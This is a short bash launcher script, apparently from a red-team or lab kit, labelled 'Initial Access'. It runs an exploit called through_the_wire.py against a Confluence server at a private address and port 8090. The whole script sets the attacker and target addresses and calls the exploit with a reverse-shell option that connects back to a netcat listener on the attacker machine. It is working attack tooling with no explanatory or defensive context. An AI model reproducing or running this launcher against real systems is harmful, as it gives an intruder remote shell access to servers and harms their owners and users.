#!/bin/bash
# Script for through_the_wire.py - Initial Access

# netcat / attacker IP (This machine)
LHOST=10.0.0.5
LHOSTPORT=4243

# target machine IP (Confluence)
RHOST=10.0.0.3
RHOSTPORT=8090

python3 /tmp/1_InitialAccess/through_the_wire.py --lhost $LHOST --lport $LHOSTPORT --rhost $RHOST --rport $RHOSTPORT --reverse-shell --protocol http:// --nc-path /bin/netcat